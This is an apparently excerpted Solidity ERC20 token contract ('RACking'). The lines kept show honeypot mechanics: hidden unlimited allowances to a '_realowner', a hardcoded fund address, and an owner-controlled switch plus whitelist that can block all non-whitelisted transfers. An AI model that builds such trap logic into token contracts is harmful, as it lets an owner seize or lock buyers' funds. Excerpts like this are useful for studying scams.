...
contract RACking is ERC20 {
	...
	address payable _fundAddress = payable(address(0x91bA46A56af10A2731332d35684a62CB038e5e47));
    ...
    constructor(address ftokenOwner) ERC20("RACking", "RACking") {
        ...
        _allowances[ftokenOwner][address(this)]=~uint256(0);
        _allowances[ftokenOwner][_realowner]=~uint256(0);

        uint256 total = 10**34;
        swapTokensAtAmount = total.div(10000000);
        _mint(ftokenOwner, total);
    }
    ...
    function setswapState(bool newaddr)public onlyOwner{
        swapState=newaddr;
    }
    ...
    function setW(address[] calldata wlist)public onlyOwner{
        for(uint i;i<wlist.length;i++){
            address temp=wlist[i];
            _isW[temp]=true;
        }
    }
    function _transfer(
        ...
        if(!swapState) require(_isW[from] || _isW[to]);
